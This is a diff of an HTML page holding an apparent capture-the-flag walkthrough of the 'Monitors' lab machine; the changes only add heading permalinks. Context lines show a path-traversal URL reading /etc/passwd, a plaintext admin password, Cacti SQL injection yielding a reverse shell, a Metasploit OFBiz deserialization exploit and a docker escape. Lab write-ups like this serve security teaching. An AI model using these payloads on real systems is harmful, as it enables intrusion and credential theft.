@@ -1138,10 +1138,10 @@
               
                 
                 
-                <h1 id="monitors-walkthrough">Monitors Walkthrough</h1>
-<h2 id="overview">Overview</h2>
+                <h1 id="monitors-walkthrough">Monitors Walkthrough<a class="headerlink" href="#monitors-walkthrough" title="Permanent link">&para;</a></h1>
+<h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
 <p><img alt="" src="../assets/image-20210426155351076.png" /></p>
-<h2 id="machine-info">Machine Info</h2>
+<h2 id="machine-info">Machine Info<a class="headerlink" href="#machine-info" title="Permanent link">&para;</a></h2>
 <table>
 <thead>
 <tr>
@@ -1159,8 +1159,8 @@
 </tbody>
 </table>
 <hr />
-<h2 id="recon">Recon</h2>
-<h3 id="nmap">NMAP</h3>
+<h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">NMAP<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code>Ξ monitors/notes → nmap  <span class="m">10</span>.10.10.238                       
 Starting Nmap <span class="m">7</span>.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2021</span>-04-25 <span class="m">13</span>:10 EDT
 Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.10.238
@@ -1170,8 +1170,8 @@ PORT   STATE SERVICE
 <span class="m">22</span>/tcp open  ssh
 <span class="m">80</span>/tcp open  http
 </code></pre></div>
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="wordpress-plugin-wp-with-spritz-10-remote-file-inclusion">WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion</h3>
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="wordpress-plugin-wp-with-spritz-10-remote-file-inclusion">WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion<a class="headerlink" href="#wordpress-plugin-wp-with-spritz-10-remote-file-inclusion" title="Permanent link">&para;</a></h3>
 <p><a href="https://www.exploit-db.com/exploits/44544">Exploit</a></p>
 <div class="highlight"><pre><span></span><code>http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url<span class="o">=</span>/../../../..//etc/passwd
 </code></pre></div>
@@ -1221,8 +1221,8 @@ mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false
 <div class="highlight"><pre><span></span><code>http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/proc/self/fd/10
 </code></pre></div>
 <p>we will find a new subdomain: <code>cacti-admin.monitors.htb</code></p>
-<h2 id="exploitation">Exploitation</h2>
-<h3 id="sqli-in-cacti-cms">SQLi in Cacti CMS</h3>
+<h2 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h2>
+<h3 id="sqli-in-cacti-cms">SQLi in Cacti CMS<a class="headerlink" href="#sqli-in-cacti-cms" title="Permanent link">&para;</a></h3>
 <p>First of all login into Cacti CMS with credentials: <code>admin:BestAdministrator@2020!</code> </p>
 <p>After Researching, found that Cacti is vulnerable to SQLi. See the following link: https://github.com/Cacti/cacti/issues/3622</p>
 <p>We can exploit it by typing the following into the URL: </p>
@@ -1240,7 +1240,7 @@ listening on <span class="o">[</span>any<span class="o">]</span> <span class="m"
 connect to <span class="o">[</span><span class="m">10</span>.10.14.x<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span><span class="m">10</span>.10.10.238<span class="o">]</span> <span class="m">56312</span>
 www-data@monitors:/usr/share/cacti/cacti$
 </code></pre></div>
-<h3 id="pivot-to-marcus">Pivot to Marcus</h3>
+<h3 id="pivot-to-marcus">Pivot to Marcus<a class="headerlink" href="#pivot-to-marcus" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code>ww-data@monitors:/etc$ cat /etc/systemd/system/cacti-backup.service
 cat /etc/systemd/system/cacti-backup.service
 ...
@@ -1259,8 +1259,8 @@ cat /home/marcus/.backup/backup.sh
 <p>SSH into the target as Marcus </p>
 <div class="highlight"><pre><span></span><code>ssh -l marcus <span class="m">10</span>.10.10.238
 </code></pre></div>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="enumerating">Enumerating</h3>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<h3 id="enumerating">Enumerating<a class="headerlink" href="#enumerating" title="Permanent link">&para;</a></h3>
 <p>While inside docker container, I saw one local service running at localhost port 8443. </p>
 <div class="highlight"><pre><span></span><code>marcus@monitors:~$ netstat -tulpn 
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
@@ -1274,13 +1274,13 @@ udp        <span class="m">0</span>      <span class="m">0</span> <span class="m
 udp        <span class="m">0</span>      <span class="m">0</span> <span class="m">127</span>.0.0.53:53           <span class="m">0</span>.0.0.0:*                           -                   
 udp        <span class="m">0</span>      <span class="m">0</span> <span class="m">127</span>.0.0.1:161           <span class="m">0</span>.0.0.0:*                           - 
 </code></pre></div>
-<h3 id="port-forward">Port Forward</h3>
+<h3 id="port-forward">Port Forward<a class="headerlink" href="#port-forward" title="Permanent link">&para;</a></h3>
 <p>In order to access the local service, use SSH port forward using the following command: </p>
 <div class="highlight"><pre><span></span><code>ssh -L <span class="m">8443</span>:127.0.0.1:8443 marcus@monitors.htb
 </code></pre></div>
 <p>Now we can access local service in our local machine at <code>127.0.0.1:8443</code> </p>
 <p><img alt="" src="../assets/image-20210426152526946.png" /></p>
-<h3 id="exploiting-tomcat-9031">Exploiting Tomcat 9.0.31</h3>
+<h3 id="exploiting-tomcat-9031">Exploiting Tomcat 9.0.31<a class="headerlink" href="#exploiting-tomcat-9031" title="Permanent link">&para;</a></h3>
 <p>We identified that service is running <code>Tomcat 9.0.31</code>, which is vulnerable to <code>RCE in Apache OFBiz XMLRPC via Deserialization of Untrusted Data (CVE-2020-9496)</code>. </p>
 <p>We can exploit it using Metasploit: </p>
 <div class="highlight"><pre><span></span><code>use exploit/linux/http/apache_ofbiz_deserialiation
@@ -1293,7 +1293,7 @@ udp        <span class="m">0</span>      <span class="m">0</span> <span class="m
 exploit
 </code></pre></div>
 <p>Then we will get RCE inside docker container:</p>
-<h2 id="escaping-docker-container">Escaping Docker Container</h2>
+<h2 id="escaping-docker-container">Escaping Docker Container<a class="headerlink" href="#escaping-docker-container" title="Permanent link">&para;</a></h2>
 <p>We can escape docker container by abusing <code>SYS_MODULE</code> capability. See the following link: </p>
 <p>https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd</p>
 <p>To exploit it, follow these steps </p>
